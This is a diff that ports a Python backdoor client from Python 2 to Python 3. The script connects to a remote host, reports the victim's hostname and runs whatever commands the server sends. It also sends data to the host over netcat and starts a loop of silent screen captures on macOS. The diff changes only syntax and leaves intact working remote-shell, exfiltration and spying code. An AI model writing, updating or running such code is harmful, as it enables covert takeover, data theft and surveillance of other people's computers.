@@ -1,7 +1,7 @@
 #!/usr/bin/python
 
 import socket
-import commands
+import subprocess
 import sys
 import subprocess
 
@@ -19,12 +19,12 @@ def connect():
 	s.connect((host, port))
 
 	#Get Computer name to send to the server
-	hostName = commands.getstatusoutput('hostname')
+	hostName = subprocess.getstatusoutput('hostname')
 	s.send('%s\n' % hostName[1])
 	return s
 
 def runCmd(comm):
-	result = commands.getstatusoutput('%s' % comm)
+	result = subprocess.getstatusoutput('%s' % comm)
 	result2 = result[1] + '\n'
 	return result2
 
@@ -44,11 +44,11 @@ while 1:
 		break
 	
 	elif comm == 'speak':
-		print 'hit speak cond'
+		print('hit speak cond')
 		data2 = data[:-1].split(' ', 1)
 		data2[0] = 'say'
 		data3 = data2[0] + ' ' + data2[1]
-		print data3
+		print(data3)
 		i = 0
 		volSet = 'osascript -e "set Volume 5"'
 		proc2 = runCmd(volSet)
@@ -63,7 +63,7 @@ while 1:
 		data2 = data[:-1].split(' ', 2)
 		data2[0] = 'nc %s' % host 
 		data3 = data2[0] + ' %s > ' % data2[2] + data2[1]
-		print data3
+		print(data3)
 		proc2 = runCmd(data3)
 	
 	elif comm == 'screengrab':
@@ -79,9 +79,9 @@ do
 sleep 1
 screencapture -C -x stream.jpg
 done'''
-		commands.getstatusoutput('touch stream.sh')
-		commands.getstatusoutput('echo "%s" > stream.sh' % stream)
-		commands.getstatusoutput('chmod +x stream.sh')
+		subprocess.getstatusoutput('touch stream.sh')
+		subprocess.getstatusoutput('echo "%s" > stream.sh' % stream)
+		subprocess.getstatusoutput('chmod +x stream.sh')
 		fio = subprocess.Popen(['bash', 'stream.sh'])
 		proc2 = 'Ran command: Goto client with browser on port 8053 and browse to stream.jpg'
 	
